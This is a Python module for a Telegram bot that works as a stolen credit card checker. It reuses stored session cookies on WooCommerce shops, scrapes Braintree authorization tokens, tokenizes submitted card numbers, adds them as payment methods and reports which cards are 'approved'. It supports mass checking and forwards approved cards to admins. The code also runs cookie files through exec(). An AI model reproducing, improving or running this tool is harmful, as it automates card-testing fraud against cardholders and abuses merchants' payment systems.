import telebot
import re
import threading
import time
import json
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from datetime import datetime
import requests
import base64
from bs4 import BeautifulSoup
from user_agent import generate_user_agent
import random
import urllib3
import sys
import io
import codecs
import os
import glob

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Global variables to store site and cookie info
SITES = []
SELECTED_SITE_INFO = None

user = generate_user_agent()

def discover_cookie_pairs():
    """Discover available cookie pairs in the current directory"""
    try:
        # Find all cookies_X-1.txt files
        pattern1 = 'checker/cookies_*-1.txt'
        pattern2 = 'checker/cookies_*-2.txt'
        
        print(f"DEBUG: Searching for pattern1: {pattern1}")
        print(f"DEBUG: Searching for pattern2: {pattern2}")

        files1 = glob.glob(pattern1)
        files2 = glob.glob(pattern2)
        
        print(f"DEBUG: Found files1: {files1}")
        print(f"DEBUG: Found files2: {files2}")

        # Extract the pair identifiers (e.g., "1" from "cookies_1-1.txt")
        pairs = []
        for file1 in files1:
            # Extract the pair number from filename like "cookies_1-1.txt"
            # Extract just the filename (e.g., "cookies_1-1.txt")
            filename = os.path.basename(file1)
            # Extract the pair number (e.g., "1" from "cookies_1-1.txt")
            pair_id = filename.replace('cookies_', '').replace('-1.txt', '')
            file2_expected = os.path.join('checker', f'cookies_{pair_id}-2.txt')
            
            print(f"DEBUG: Processing file1: {file1}, extracted pair_id: {pair_id}, expected file2: {file2_expected}")

            if file2_expected in files2:
                pairs.append({
                    'id': pair_id,
                    'file1': file1,
                    'file2': file2_expected
                })
            else:
                print(f"DEBUG: {file2_expected} not found in files2.")
        
        print(f"DEBUG: Discovered cookie pairs: {pairs}")
        return pairs
    except Exception as e:
        print(f"Error discovering cookie pairs: {str(e)}")
        return []

def load_sites_and_cookies():
    """Load sites from site.txt and map them to cookie pairs."""
    global SITES
    try:
        with open('checker/site.txt', 'r') as f:
            site_urls = [line.strip() for line in f.read().splitlines() if line.strip()]
        print(f"DEBUG: Loaded site_urls: {site_urls}")
        
        cookie_pairs = discover_cookie_pairs()
        print(f"DEBUG: Received cookie_pairs from discover_cookie_pairs: {cookie_pairs}")
        
        # Map sites to cookie pairs by index
        for i, url in enumerate(site_urls):
            pair_id_to_find = str(i + 1)
            matching_pair = next((p for p in cookie_pairs if p['id'] == pair_id_to_find), None)
            
            print(f"DEBUG: Matching site {url} with pair_id {pair_id_to_find}. Matching pair: {matching_pair}")

            if matching_pair:
                SITES.append({
                    'url': url,
                    'cookie_pair': matching_pair
                })
            else:
                print(f"Warning: No cookie pair found for site {url} (expected pair ID: {pair_id_to_find})")

        print(f"DEBUG: Final SITES list: {SITES}")
    except Exception as e:
        print(f"Error loading sites and cookies: {str(e)}")

def select_random_site():
    """Select a random site and its cookie pair."""
    global SELECTED_SITE_INFO
    if not SITES:
        load_sites_and_cookies()
    
    if SITES:
        SELECTED_SITE_INFO = random.choice(SITES)
        print(f"🎲 Selected site: {SELECTED_SITE_INFO['url']} with cookie pair {SELECTED_SITE_INFO['cookie_pair']['id']}")
    else:
        print("Error: No sites configured.")
        SELECTED_SITE_INFO = None

def get_domain_url():
    """Get the URL of the currently selected site."""
    if SELECTED_SITE_INFO:
        return SELECTED_SITE_INFO['url']
    return ""

def read_cookies_from_file(filename):
    """Read cookies from a specific file"""
    try:
        with open(filename, 'r') as f:
            content = f.read()
            # Create a namespace dictionary for exec
            namespace = {}
            exec(content, namespace)
            return namespace['cookies']
    except Exception as e:
        print(f"Error reading {filename}: {str(e)}")
        return {}

# Read cookies from the selected first cookie file
def get_cookies_1():
    if SELECTED_SITE_INFO:
        return read_cookies_from_file(SELECTED_SITE_INFO['cookie_pair']['file1'])
    return {}

# Read cookies from the selected second cookie file
def get_cookies_2():
    if SELECTED_SITE_INFO:
        return read_cookies_from_file(SELECTED_SITE_INFO['cookie_pair']['file2'])
    return {}

def get_headers():
    """Get headers with current domain URL"""
    domain_url = get_domain_url()
    return {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'dnt': '1',
        'priority': 'u=0, i',
        'referer': f'{domain_url}/my-account/payment-methods/',
        'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'sec-gpc': '1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    }

def get_random_proxy():
    """Disable proxy functionality by always returning None."""
    return None

def get_random_address():
    """Generate a random address"""
    return {
        'postalCode': str(random.randint(10000, 99999)),
        'streetAddress': f'{random.randint(1, 999)} {random.choice(["Street", "Avenue", "Boulevard", "Drive"])}'
    }

def get_new_auth():
    """Get fresh authorization tokens"""
    domain_url = get_domain_url()  # Read fresh domain URL
    cookies_1 = get_cookies_1()    # Read fresh cookies
    headers = get_headers()        # Get headers with current domain
    
    proxy = get_random_proxy()
    response = requests.get(
        f'{domain_url}/my-account/add-payment-method/',
        cookies=cookies_1,
        headers=headers,
        proxies=proxy,
        verify=False
    )
    if response.status_code == 200:
        # Get add_nonce
        add_nonce = re.findall('name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
        if not add_nonce:
            print("Error: Nonce not found in response")
            return None, None

        # Get authorization token
        i0 = response.text.find('wc_braintree_client_token = ["')
        if i0 != -1:
            i1 = response.text.find('"]', i0)
            token = response.text[i0 + 30:i1]
            try:
                decoded_text = base64.b64decode(token).decode('utf-8')
                au = re.findall(r'"authorizationFingerprint":"(.*?)"', decoded_text)
                if not au:
                    print("Error: Authorization fingerprint not found")
                    return None, None
                return add_nonce[0], au[0]
            except Exception as e:
                print(f"Error decoding token: {str(e)}")
                return None, None
        else:
            print("Error: Client token not found in response")
            return None, None
    else:
        print(f"Error: Failed to fetch payment page, status code: {response.status_code}")
        return None, None

def get_bin_info(bin_number):
    try:
        response = requests.get(f'https://api.voidex.dev/api/bin?bin={bin_number}', timeout=10)
        if response.status_code == 200:
            data = response.json()

            # Check if we have valid data
            if not data or 'brand' not in data:
                return {
                    'brand': 'UNKNOWN',
                    'type': 'UNKNOWN',
                    'level': 'UNKNOWN',
                    'bank': 'UNKNOWN',
                    'country': 'UNKNOWN',
                    'emoji': '🏳️'
                }

            # Return data mapped from Voidex API response
            return {
                'brand': data.get('brand', 'UNKNOWN'),
                'type': data.get('type', 'UNKNOWN'),
                'level': data.get('brand', 'UNKNOWN'),  # Using brand as level fallback
                'bank': data.get('bank', 'UNKNOWN'),
                'country': data.get('country_name', 'UNKNOWN'),
                'emoji': data.get('country_flag', '🏳️')
            }

        return {
            'brand': 'UNKNOWN',
            'type': 'UNKNOWN',
            'level': 'UNKNOWN',
            'bank': 'UNKNOWN',
            'country': 'UNKNOWN',
            'emoji': '🏳️'
        }
    except Exception as e:
        print(f"BIN lookup error: {str(e)}")
        return {
            'brand': 'UNKNOWN',
            'type': 'UNKNOWN',
            'level': 'UNKNOWN',
            'bank': 'UNKNOWN',
            'country': 'UNKNOWN',
            'emoji': '🏳️'
        }

def check_status(result):
    # First, check if the message contains "Reason:" and extract the specific reason
    if "Reason:" in result:
        # Extract everything after "Reason:"
        reason_part = result.split("Reason:", 1)[1].strip()

        # Check if it's one of the approved patterns
        approved_patterns = [
            'Nice! New payment method added',
            'Payment method successfully added.',
            'Insufficient Funds',
            'Duplicate',
            'Payment method added successfully',
            'Invalid postal code or street address',
            'You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds',
        ]

        cvv_patterns = [
            'CVV',
            'Gateway Rejected: avs_and_cvv',
            'Card Issuer Declined CVV',
            'Gateway Rejected: cvv'
        ]

        # Check if the extracted reason matches approved patterns
        for pattern in approved_patterns:
            if pattern in result:
                return "APPROVED", "Approved", True

        # Check if the extracted reason matches CVV patterns
        for pattern in cvv_patterns:
            if pattern in reason_part:
                return "DECLINED", "Reason: CVV", False

        # Return the extracted reason for declined cards
        return "DECLINED", reason_part, False

    # If "Reason:" is not found, use the original logic
    approved_patterns = [
        'Nice! New payment method added',
        'Payment method successfully added.',
        'Insufficient Funds',
        'Duplicate',
        'Payment method added successfully',
        'Invalid postal code or street address',
        'You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds',
    ]

    cvv_patterns = [
        'Reason: CVV',
        'Gateway Rejected: avs_and_cvv',
        'Card Issuer Declined CVV',
        'Gateway Rejected: cvv'
    ]

    for pattern in approved_patterns:
        if pattern in result:
            return "APPROVED", "Approved", True

    for pattern in cvv_patterns:
        if pattern in result:
            return "DECLINED", "Reason: CVV", False

    return "DECLINED", result, False

def check_card(cc_line):
    # Select a random site and cookie pair for this card check
    select_random_site()
    
    from datetime import datetime
    start_time = time.time()

    try:
        domain_url = get_domain_url()  # Read fresh domain URL
        if not domain_url:
            return "❌ No site selected. Check site.txt and cookie files."
            
        cookies_2 = get_cookies_2()    # Read fresh cookies
        headers = get_headers()        # Get headers with current domain
        
        add_nonce, au = get_new_auth()
        if not add_nonce or not au:
            return "❌ Authorization failed. Try again later."

        n, mm, yy, cvc = cc_line.strip().split('|')
        if not yy.startswith('20'):
            yy = '20' + yy

        random_address = get_random_address()
        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': 'cc600ecf-f0e1-4316-ac29-7ad78aeafccd',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': n,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvc,
                        'billingAddress': {
                            'postalCode': random_address['postalCode'],
                            'streetAddress': random_address['streetAddress'],
                        },
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        headers_token = {
            'authorization': f'Bearer {au}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'user-agent': user
        }

        proxy = get_random_proxy()
        response = requests.post(
            'https://payments.braintree-api.com/graphql',
            headers=headers_token,
            json=json_data,
            proxies=proxy,
            verify=False
        )

        if response.status_code != 200:
            return f"❌ Tokenization failed. Status: {response.status_code}"

        token = response.json()['data']['tokenizeCreditCard']['token']

        headers_submit = headers.copy()
        headers_submit['content-type'] = 'application/x-www-form-urlencoded'

        data = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': token,
            'braintree_cc_device_data': '{"correlation_id":"cc600ecf-f0e1-4316-ac29-7ad78aea"}',
            'woocommerce-add-payment-method-nonce': add_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }

        proxy = get_random_proxy()
        response = requests.post(
            f'{domain_url}/my-account/add-payment-method/',
            cookies=cookies_2,  # Use fresh cookies
            headers=headers,
            data=data,
            proxies=proxy,
            verify=False
        )

        elapsed_time = time.time() - start_time
        soup = BeautifulSoup(response.text, 'html.parser')
        error_div = soup.find('div', class_='woocommerce-notices-wrapper')
        message = error_div.get_text(strip=True) if error_div else "❌ Unknown error"

        status, reason, approved = check_status(message)
        bin_info = get_bin_info(n[:6]) or {}

        response_text = f"""
{status} {'❌' if not approved else '✅'}

𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth 1
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {reason}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}

𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

𝗕𝗼𝘁 𝗯𝘆 : @bro_bin_lagbe
"""
        return response_text

    except Exception as e:
        return f"❌ Error: {str(e)}"

def normalize_card(text):
    """
    Normalize credit card from any format to cc|mm|yy|cvv
    """
    if not text:
        return None

    text = text.replace('\n', ' ').replace('/', ' ')
    numbers = re.findall(r'\d+', text)

    cc = mm = yy = cvv = ''

    for part in numbers:
        if len(part) == 16:
            cc = part
        elif len(part) == 4 and part.startswith('20'):
            yy = part
        elif len(part) == 2 and int(part) <= 12 and mm == '':
            mm = part
        elif len(part) == 2 and not part.startswith('20') and yy == '':
            yy = '20' + part
        elif len(part) in [3, 4] and cvv == '':
            cvv = part

    if cc and mm and yy and cvv:
        return f"{cc}|{mm}|{yy}|{cvv}"

    return None

def register(bot, custom_command_handler, command_prefixes_list, is_authorized_func, admin_ids_list):
    @custom_command_handler("b3")
    def b3_handler(msg):
        auth_id = msg.chat.id if msg.chat.type in ['group', 'supergroup'] else msg.from_user.id
        if not is_authorized_func(auth_id):
            return bot.reply_to(msg, """✦━━━[  ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ ]━━━✦

⟡ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴛᴏ ᴜꜱᴇ ᴛʜɪꜱ ʙᴏᴛ
⟡ ᴏɴʟʏ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴍᴇᴍʙᴇʀꜱ ᴜꜱᴇ ᴛʜɪꜱ ʙᴏᴛ

✧ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ ꜰᴏʀ ᴀᴜᴛʜᴏʀɪᴢᴀᴛɪᴏɴ
✧ ᴀᴅᴍɪɴ: @bro_bin_lagbe""")
        cc = None

        if msg.reply_to_message:
            replied_text = msg.reply_to_message.text or ""
            cc = normalize_card(replied_text)

            if not cc:
                return bot.reply_to(msg, "✦━━━[ ɪɴᴠᴀʟɪᴅ ꜰᴏʀᴍᴀᴛ ]━━━✦\n\n"
    "⟡ ᴄᴏᴜʟᴅɴ'ᴛ ᴇxᴛʀᴀᴄᴛ ᴠᴀʟɪᴅ ᴄᴀʀᴅ ɪɴꜰᴏ ꜰʀᴏᴍ ʀᴇᴘʟɪᴇᴅ ᴍᴇꜱꜱᴀɢᴇ\n\n"
    "ᴄᴏʀʀᴇᴄᴛ ꜰᴏʀᴍᴀᴛ\n\n"
    "`/b3 4556737586899855|12|2026|123`\n\n"
    "✧ ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ ɪꜰ ʏᴏᴜ ɴᴇᴇᴅ ʜᴇʟᴘ")
        else:
            args = msg.text.split(None, 1)
            if len(args) < 2:
                return bot.reply_to(msg, "✦━━━[ ɪɴᴠᴀʟɪᴅ ꜰᴏʀᴍᴀᴛ ]━━━✦\n\n"
    "⟡ ᴘʟᴇᴀꜱᴇ ᴜꜱᴇ ᴛʜᴇ ᴄᴏʀʀᴇᴄᴛ ꜰᴏʀᴍᴀᴛ ᴛᴏ ᴄʜᴇᴄᴋ ᴄᴀʀᴅꜱ\n\n"
    "ᴄᴏʀʀᴇᴄᴛ ꜰᴏʀᴍᴀᴛ\n\n"
    "`/b3 4556737586899855|12|2026|123`\n\n"
    "ᴏʀ ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴍᴇꜱꜱᴀɢᴇ ᴄᴏɴᴛᴀɪɴɪɴɢ ᴄᴄ ᴡɪᴛʜ `/b3`\n\n"
    "✧ ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ ɪꜰ ʏᴏᴜ ɴᴇᴇᴅ ʜᴇʟᴘ")

            raw_input = args[1]

            if re.match(r'^\d{16}\|\d{2}\|\d{2,4}\|\d{3,4}$', raw_input):
                cc = raw_input
            else:
                cc = normalize_card(raw_input)
                if not cc:
                    cc = raw_input

        processing = bot.reply_to(msg, "✦━━━[  ᴘʀᴏᴄᴇꜱꜱɪɴɢ ]━━━✦\n\n"
    "⟡ ʏᴏᴜʀ ᴄᴀʀᴅ ɪꜱ ʙᴇɪɴɢ ᴄʜᴇᴄᴋ...\n"
    "⟡ ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ ᴀ ꜰᴇᴡ ꜱᴇᴄᴏɴᴅꜱ\n\n"
    "✧ ᴅᴏ ɴᴏᴛ ꜱᴘᴀᴍ ᴏʀ ʀᴇꜱᴜʙᴍɪᴛ ✧")

        def check_and_reply():
            try:
                result = check_card(cc)
                bot.edit_message_text(result, msg.chat.id, processing.message_id, parse_mode='HTML')
            except Exception as e:
                bot.edit_message_text(f"❌ Error: {str(e)}", msg.chat.id, processing.message_id)

        threading.Thread(target=check_and_reply).start()

    @custom_command_handler("mb3")
    def mb3_handler(msg):
        auth_id = msg.chat.id if msg.chat.type in ['group', 'supergroup'] else msg.from_user.id
        if not is_authorized_func(auth_id):
            return bot.reply_to(msg, """✦━━━[  ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ ]━━━✦

⟡ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴛᴏ ᴜꜱᴇ ᴛʜɪꜱ ʙᴏᴛ
⟡ ᴏɴʟʏ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴍᴇᴍʙᴇʀꜱ ᴜꜱᴇ ᴛʜɪꜱ ʙᴏᴛ

✧ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ ꜰᴏʀ ᴀᴜᴛʜᴏʀɪᴢᴀᴛɪᴏɴ
✧ ᴀᴅᴍɪɴ: @bro_bin_lagbe""")
        text_to_process = ""
        is_document_reply = False
        
        args = msg.text.split(None, 1)

        if len(args) > 1: # Direct argument provided
            text_to_process = args[1]
        elif msg.reply_to_message: # Reply to a message
            reply = msg.reply_to_message
            if reply.document:
                is_document_reply = True
                file_info = bot.get_file(reply.document.file_id)
                downloaded_file = bot.download_file(file_info.file_path)
                text_to_process = downloaded_file.decode('utf-8', errors='ignore')
            else:
                text_to_process = reply.text or ""
        
        if not text_to_process.strip():
            return bot.reply_to(msg, "✦━━━[ ᴡʀᴏɴɢ ᴜꜱᴀɢᴇ ]━━━✦\n\n"
    "⟡ ᴘʟᴇᴀꜱᴇ ᴘʀᴏᴠɪᴅᴇ ᴄʀᴇᴅɪᴛ ᴄᴀʀᴅ ᴛᴇxᴛ ᴅɪʀᴇᴄᴛʟʏ ᴏʀ ʀᴇᴘʟʏ ᴛᴏ ᴀ `.txt` ꜰɪʟᴇ ᴏʀ ᴄʀᴇᴅɪᴛ ᴄᴀʀᴅ ᴛᴇxᴛ\n\n"
    "ᴄᴏʀʀᴇᴄᴛ ꜰᴏʀᴍᴀᴛ\n\n"
    "`/mb3 4556737586899855|12|2026|123`\n\n"
    "ᴏʀ ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴍᴇꜱꜱᴀɢᴇ ᴄᴏɴᴛᴀɪɴɪɴɢ ᴄᴄ ᴡɪᴛʜ `/mb3`\n\n"
    "✧ ᴏɴʟʏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴄʜᴇᴄᴋᴇᴅ & ᴀᴘᴘʀᴏᴠᴇᴅ ᴄᴀʀᴅꜱ ꜱʜᴏᴡɴ ✧")

        cc_lines = []
        for line in text.splitlines():
            line = line.strip()
            if not line:
                continue

            normalized_cc = normalize_card(line)
            if normalized_cc:
                cc_lines.append(normalized_cc)
            else:
                found = re.findall(r'\b(?:\d[ -]*?){13,16}\b.*?\|.*?\|.*?\|.*', line)
                if found:
                    cc_lines.extend(found)
                else:
                    parts = re.findall(r'\d{12,16}[|: -]\d{1,2}[|: -]\d{2,4}[|: -]\d{3,4}', line)
                    cc_lines.extend(parts)

        if not cc_lines:
            return bot.reply_to(msg, "✦━━━[ ⚠️ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ]━━━✦\n\n"
    "⟡ ɴᴏ ᴠᴀʟɪᴅ ᴄʀᴇᴅɪᴛ ᴄᴀʀᴅꜱ ᴅᴇᴛᴇᴄᴛᴇᴅ ɪɴ ᴛʜᴇ ꜰɪʟᴇ\n"
    "⟡ ᴘʟᴇᴀꜱᴇ ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴄᴀʀᴅꜱ ᴀʀᴇ ɪɴ ᴄᴏʀʀᴇᴄᴛ ꜰᴏʀᴍᴀᴛ\n\n"
    "ᴄᴏʀʀᴇᴄᴛ ꜰᴏʀᴍᴀᴛ\n"
    "`4556737586899855|12|2026|123`\n\n"
    "✧ ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ ɪꜰ ʏᴏᴜ ɴᴇᴇᴅ ʜᴇʟᴘ")

        if not is_document_reply and len(cc_lines) > 15:
            return bot.reply_to(msg, "✦━━━[ ⚠️ ʟɪᴍɪᴛ ᴇxᴄᴇᴇᴅᴇᴅ ]━━━✦\n\n"
    "⟡ ᴏɴʟʏ 15 ᴄᴀʀᴅꜱ ᴀʟʟᴏᴡᴇᴅ ɪɴ ʀᴀᴡ ᴘᴀꜱᴛᴇ ᴏʀ ᴅɪʀᴇᴄᴛ ᴀʀɢᴜᴍᴇɴᴛ\n"
    "⟡ ꜰᴏʀ ᴍᴏʀᴇ ᴄᴀʀᴅꜱ, ᴘʟᴇᴀꜱᴇ ᴜᴘʟᴏᴀᴅ ᴀ `.txt` ꜰɪʟᴇ")

        total = len(cc_lines)
        user_id = msg.from_user.id

        kb = InlineKeyboardMarkup(row_width=1)
        buttons = [
            InlineKeyboardButton(f"ᴀᴘᴘʀᴏᴠᴇᴅ 0 ✅", callback_data="none"),
            InlineKeyboardButton(f"ᴅᴇᴄʟɪɴᴇᴅ 0 ❌", callback_data="none"),
            InlineKeyboardButton(f"ᴛᴏᴛᴀʟ ᴄʜᴇᴄᴋᴇᴅ 0", callback_data="none"),
            InlineKeyboardButton(f"ᴛᴏᴛᴀʟ {total} ✅", callback_data="none"),
        ]
        for btn in buttons:
            kb.add(btn)

        status_msg = bot.send_message(user_id, f"✦━━━[  ᴍᴀꜱꜱ ᴄʜᴇᴄᴋ ꜱᴛᴀʀᴛᴇᴅ ]━━━✦\n\n"
    "⟡ ᴘʀᴏᴄᴇꜱꜱɪɴɢ ʏᴏᴜʀ ᴄᴀʀᴅꜱ...\n"
    "⟡ ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ ᴀ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ\n\n"
    " ʟɪᴠᴇ ꜱᴛᴀᴛᴜꜱ ᴡɪʟʟ ʙᴇ ᴜᴘᴅᴀᴛᴇᴅ ʙᴇʟᴏᴡ", reply_markup=kb)

        approved, declined, checked = 0, 0, 0

        def process_all():
            nonlocal approved, declined, checked
            for cc in cc_lines:
                try:
                    checked += 1
                    result = check_card(cc.strip())
                    if "[APPROVED]" in result:
                        approved += 1
                        bot.send_message(user_id, result, parse_mode='HTML')
                        if user_id not in admin_ids_list:
                            for admin_id in admin_ids_list:
                                bot.send_message(admin_id, f"✅ Approved by {user_id}:\n{result}", parse_mode='HTML')
                    else:
                        declined += 1

                    new_kb = InlineKeyboardMarkup(row_width=1)
                    new_kb.add(
                        InlineKeyboardButton(f"ᴀᴘᴘʀᴏᴠᴇᴅ {approved} 🔥", callback_data="none"),
                        InlineKeyboardButton(f"ᴅᴇᴄʟɪɴᴇᴅ {declined} ❌", callback_data="none"),
                        InlineKeyboardButton(f"ᴛᴏᴛᴀʟ ᴄʜᴇᴄᴋᴇᴅ {checked} ✔️", callback_data="none"),
                        InlineKeyboardButton(f"ᴛᴏᴛᴀʟ {total} ✅", callback_data="none"),
                    )
                    bot.edit_message_reply_markup(user_id, status_msg.message_id, reply_markup=new_kb)
                    time.sleep(2)
                except Exception as e:
                    bot.send_message(user_id, f"❌ Error: {e}")

            bot.send_message(user_id, "✦━━━[ ᴄʜᴇᴄᴋɪɴɢ ᴄᴏᴍᴘʟᴇᴛᴇᴅ ]━━━✦\n\n"
    "⟡ ᴀʟʟ ᴄᴀʀᴅꜱ ʜᴀᴠᴇ ʙᴇᴇɴ ᴘʀᴏᴄᴇꜱꜱᴇᴅ\n"
    "⟡ ᴛʜᴀɴᴋ ʏᴏᴜ ꜰᴏʀ ᴜꜱɪɴɢ ᴍᴀꜱꜱ ᴄʜᴇᴄᴋ\n\n"
    " ᴏɴʟʏ ᴀᴘᴘʀᴏᴠᴇᴅ ᴄᴀʀᴅꜱ ᴡᴇʀᴇ ꜱʜᴏᴡɴ ᴛᴏ ʏᴏᴜ\n"
    " ʏᴏᴜ ᴄᴀɴ ʀᴜɴ /mb3 ᴀɢᴀɪɴ ᴡɪᴛʜ ᴀ ɴᴇᴡ ʟɪꜱᴛ")

        threading.Thread(target=process_all).start()

# Initialize sites and cookies when the handler is loaded
load_sites_and_cookies()
